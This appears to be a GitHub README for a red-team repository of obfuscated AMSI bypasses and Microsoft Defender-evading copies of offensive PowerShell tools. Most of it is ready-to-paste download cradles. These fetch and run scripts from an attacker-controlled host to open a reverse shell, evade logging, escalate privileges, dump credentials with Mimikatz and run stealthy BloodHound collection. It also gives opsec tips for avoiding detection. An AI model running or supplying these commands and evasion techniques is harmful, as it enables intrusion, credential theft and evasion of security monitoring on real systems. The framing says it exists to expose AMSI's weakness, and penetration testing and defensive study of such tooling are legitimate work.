
<h1 align="center">
<br>
<img src=ihateamsi.jpg height="310" border="2px solid #555">
<br>
i hate AMSI
</h1>
<h4 align="center">
disabling RTM is for noobs
</h4>

## what is this and why is this public

A collection of custom obfuscated AMSI bypass methods (source taken from [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)) for powershell sessions as well as a collection of obfuscated scripts for bypassing Microsoft Defender.

Even though I hate MDE, showing off how easy it is to bypass AMSI can only help make it better. Right now it is the only protection for a significant amount of home users and smaller enterprises which is bad.

These really are just for fun with staying in-memory with only powershell. I can't really recommend you use these on an engagement.

## bypass methods

I will unprivate soon :)

## MDE-safe scripts

These are all just for defender - I just used defendercheck and made some edits. Anything serious and you're on your own

- `PowerUp.ps1`
    - Removed service binaries. Hijack it yourself!
    - HTML reports removed.

- `Invoke-PowerShellTcp`
    - Removed some comments and error messages.

- `InvisiShell`
    - No changes.

- `SharpHound.ps1`
    - Had to obfuscate a reflection string.

- `winPEAS.bat`
    - Obfuscated color line string variable (terrible signature.)

- `Invoke-Mimimkatz`
    - This script is **not yet bypassed**. The VS solution source will need to be custom-compiled or encoded further. I'll fix this later.
    - Had to add some base64-strings and change a parameter on PowerShell script. `DumpCreds` is now `GetPwned`. **Do not use this option** if you want to be opsec safe!

## download cradles

These only work on PowerShell 3.0. Don't downgrade to 2.0 you will get caught

- **Reverse Shell**
```
iex (iwr http://172.16.100.X/Invoke-PowerShellTcp-OBFS.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443
```

- **Log Evasion**
```
iwr http://172.16.100.X/InvisiShellProfiler.dll -UseBasicParsing -OutFile InvisiShellProfiler.dll;
iex (iwr http://172.16.100.X/RunWithRegistryNonAdmin.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/RunWithPathAsAdmin.bat -UseBasicParsing);
```

- **Privilege Escalation**
```
iex (iwr http://172.16.100.X/winPEAS-OBFS.bat -UseBasicParsing);
iex (iwr http://172.16.100.X/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks;
```

- **Dump Creds**
```
iex (iwr http://172.16.100.X/Invoke-Mimikatz-OBFS.ps1 -UseBasicParsing); Invoke-Mimikatz -GetPwned;
```

- **Domain Abuse**

SHARPHOUND TOUCHES DISK OBVIOUSLY

```
iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMethod All -Stealth -ExcludeDCs;
```

## to-be-added

- `Invoke-SessionHunter`
- `PowerView`
- `Invoke-Rubeus`
- obfuscated shell for .net reflected assemblies (empire already has a folder for this but I will make some custom bypasses)
